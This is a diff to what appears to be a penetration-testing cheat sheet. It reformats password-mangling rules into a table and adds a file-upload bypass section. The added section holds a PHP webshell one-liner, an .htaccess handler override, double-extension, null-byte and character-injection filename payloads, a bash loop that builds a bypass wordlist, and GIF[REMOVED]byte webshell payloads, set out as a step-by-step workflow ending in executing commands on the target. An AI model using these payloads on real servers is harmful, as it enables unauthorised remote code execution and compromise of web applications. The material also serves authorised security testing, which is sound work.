@@ -3491,31 +3491,14 @@ When testing for IDOR, consider the following:
 
 ## Rules
 
-Common Rule Examples:
-
-$1: Appends "1" to the end of the word.
-
-Example: "password" → "password1"
-
-^: Prepends "1" to the word.
-
-Example: "password" → "1password"
-
-c: Capitalizes the first character of the word.
-
-Example: "password" → "Password"
-
-r: Reverses the word.
-
-Example: "password" → "drowssap"
-
-l: Converts the word to lowercase (if it’s not already).
-
-Example: "PASSWORD" → "password"
-
-^c: Capitalize the first letter and append "123".
-
-Example: "admin" → "Admin123"
+| Rule   | Description                              | Example                        |
+|--------|------------------------------------------|--------------------------------|
+| `$1`   | Appends "1" to the end of the word       | `"password" → "password1"`     |
+| `^`    | Prepends "1" to the word                 | `"password" → "1password"`     |
+| `c`    | Capitalizes the first character of the word | `"password" → "Password"`     |
+| `r`    | Reverses the word                        | `"password" → "drowssap"`      |
+| `l`    | Converts the word to lowercase (if it’s not already) | `"PASSWORD" → "password"`     |
+| `^c`   | Capitalizes the first letter and appends "123" | `"admin" → "Admin123"`        |
 
 **Common Rules to use**
 
@@ -3870,3 +3853,189 @@ You can use /proc/self/environ to inject a shell. If the environment variables a
 
 ---
 
+## Blacklisted Extensions
+
+- .jpeg.php
+- .jpg.php
+- .png.php
+- .php
+- .php3
+- .php4
+- .php5
+- .php7
+- .php8
+- .pht
+- .phar
+- .phpt
+- .pgif
+- .phtml
+- .phtm
+- .php%00.gif
+- .php\x00.gif
+- .php%00.png
+- .php\x00.png
+- .php%00.jpg
+- .php\x00.jpg
+
+---
+
+## Bypassing Filters
+
+**Changing File Extensions: if direct upload of .php files is restricted or filtered, try alternative extensions that might bypass filters.**
+
+# For PHP
+- .pHP
+- .phps
+- .php7
+- .php4
+- .php5
+- .php3
+- .xxx
+
+# For ASP(X)
+- .aspx
+- .asp
+- .ashx
+- .asmx
+
+
+1. .htaccess Override (Apache Configuration Hijacking)
+
+If the application allows .htaccess file uploads, exploit it to override MIME type handling:
+Steps:
+
+- Create .htaccess payload:
+> ```bash
+> echo "AddType application/x-httpd-php .dork" > .htaccess
+> ```
+- Upload the .htaccess file first (ensures handler registration)
+- Upload webshell with custom extension:
+# Example PHP webshell saved as shell.dork
+> ```bash
+> echo '<?php system($_GET["cmd"]); ?>' > shell.dork
+> ```
+- Access shell: https://target.com/uploads/shell.dork?cmd=whoami
+- Result: .dork files now execute as PHP despite the extension.
+
+2. Double Extension Bypass
+
+Bypass filters checking only the final extension by using double extensions.
+Vulnerable Filter Example:
+> ```php
+> // This fails on shell.php.jpg because it ends with .jpg
+> if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $filename)) {
+>    die("Invalid file type");
+> }
+> ```
+
+Steps:
+
+- 1. Craft double extension payload:
+
+    shell.php.jpg
+    shell.php.jpeg  
+    shell.php.png
+    shell.phtml.gif
+
+- 2. Upload file - server may strip first extension or execute based on internal mapping
+
+- 3. Test execution: https://target.com/uploads/shell.php.jpg
+
+Common server behaviors:
+
+    - Apache: May execute .php.jpg as PHP
+    - Nginx: Depends on try_files or MIME config
+
+3. Null Byte & Character Injection
+
+Exploit string termination or parsing differences between application and web server.
+Payloads:
+
+| Payload                    | Description                                    |
+|----------------------------|------------------------------------------------|
+| `shell.php%00.jpg`          | PHP < 5.3.4 null byte truncation               |
+| `shell.php%20.jpg`          | Space injection                                |
+| `shell.php%0a.jpg`          | Newline injection                              |
+| `shell.php%0d0a.jpg`        | CRLF injection                                 |
+| `shell.php/.jpg`            | Dot-slash                                      |
+| `shell.php\..jpg`           | Backslash escape                               |
+| `shell.php…jpg`             | Unicode ellipsis (looks like dot)              |
+| `shell.php:jpg`             | Colon separator                                |
+
+Steps:
+
+    - Test null byte (legacy PHP < 5.3.4):
+
+    - shell.php%00.jpg → server sees: shell.php
+
+    - Intercept upload request (Burp/ZAP) and modify filename parameter
+
+    - Upload and test: https://target.com/uploads/shell.php%00.jpg
+
+Detection:
+
+    - Works on old PHP (magic_quotes_gpc=Off)
+    - Fails on modern PHP (null byte filtering)
+
+Execution Workflow
+
+1. Recon → Check allowed extensions (.htaccess, images)
+2. .htaccess → Register custom handler (.dork → PHP)  
+3. Double Ext → shell.php.jpg (bypass suffix checks)
+4. Null Byte → shell.php%00.jpg (truncate extension)
+5. Verify → Access uploaded shell, execute commands
+
+
+# Script for all permutations
+> ```bash
+> for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+>     for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
+>         echo "shell$char$ext.jpg" >> wordlist.txt
+>         echo "shell$ext$char.jpg" >> wordlist.txt
+>         echo "shell.jpg$char$ext" >> wordlist.txt
+>         echo "shell.jpg$ext$char" >> wordlist.txt
+>     done
+> done
+> ```
+    
+### MIME (Multipurpose Internet Mail Extensions) Type Spoofing
+
+You can use tools or manual methods to alter the MIME type of a file being uploaded. By inspecting the initial bytes of a file, you can identify its **File Signature** or **Magic Bytes**. For example:
+
+- **GIF87a** or **GIF89a** signifies a GIF image.
+- **Plaintext** indicates a Text file.
+
+By altering the initial bytes to match the GIF magic bytes, you can change the MIME type to a GIF image, disregarding the actual content or extension. GIF images start with ASCII printable bytes, which makes them easy to imitate. The string **GIF8** is common to both GIF signatures, simplifying the process of creating a fake GIF image.
+
+# Payload code
+> ```php
+> GIF89a;
+> <?
+> system($_GET['cmd']); //or you can insert your complete shell code
+> ?>
+> //
+> ```
+or
+> ```php
+> GIF8
+> <?
+> system($_GET['cmd']); //or you can insert your complete shell code
+> ?>
+> ```
+
+# Example
+> ```bash
+> echo "GIF8" > text.jpg 
+> file text.jpg
+> text.jpg: GIF image data
+> ```
+
+# Code to Test MIME type of uplaoded file
+> ```php
+> $type = mime_content_type($_FILES['uploadFile']['tmp_name']);
+>
+> if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
+>    echo "Only images are allowed";
+>    die();
+> }
+> ```
